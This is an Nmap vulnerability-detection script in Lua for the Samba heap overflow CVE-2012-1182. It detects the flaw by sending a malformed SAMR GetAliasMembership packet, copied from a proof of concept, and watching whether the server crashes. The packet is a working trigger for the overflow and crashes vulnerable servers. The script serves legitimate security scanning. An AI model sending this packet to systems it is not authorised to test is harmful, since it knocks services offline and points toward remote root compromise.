hostrule = function(host)
  return smb.get_port(host) ~= nil
end

action = function(host,port)

  local result, stats
  local response = {}

  local samba_cve  = {
    title = "SAMBA remote heap overflow",
    IDS = {CVE = 'CVE-2012-1182'},
    risk_factor = "HIGH",
    scores = {
      CVSSv2 = "10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)",
    },
    description = [[
Samba versions 3.6.3 and all versions previous to this are affected by
a vulnerability that allows remote code execution as the "root" user
from an anonymous connection.
]],
    references = {
      'http://www.samba.org/samba/security/CVE-2012-1182',
    },
    dates = {
      disclosure = {year = '2012', month = '03', day = '15'},
    },
    exploit_results = {},
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  samba_cve.state = vulns.STATE.NOT_VULN

  -- create SMB session
  local status, smbstate
  status, smbstate = msrpc.start_smb(host, msrpc.SAMR_PATH,true)
  if(status == false) then
    return false, smbstate
  end

  -- bind to SAMR service
  local bind_result
  status, bind_result = msrpc.bind(smbstate, msrpc.SAMR_UUID, msrpc.SAMR_VERSION, nil)
  if(status == false) then
    msrpc.stop_smb(smbstate)
    return false, bind_result
  end

  -- create malicious packet, same as in the PoC
  local data = string.pack("<I4",4096)  -- num_sids
    .. "abcd"
    ..string.pack("<I4I4I4",100
      ,0
      ,100)
    ..string.rep("a",1000)

  local marshaledHandle = string.rep("X",20)
  status, result = msrpc.samr_getaliasmembership(smbstate,marshaledHandle, data)
  stdnse.debug2("msrpc.samr_getaliasmembership: %s, '%s'", status, result)
  if(status == false and string.find(result,"Failed to receive bytes after 5 attempts") ~= nil) then
    samba_cve.state = vulns.STATE.VULN -- connection dropped, server crashed
  end

  return report:make_output(samba_cve)

end
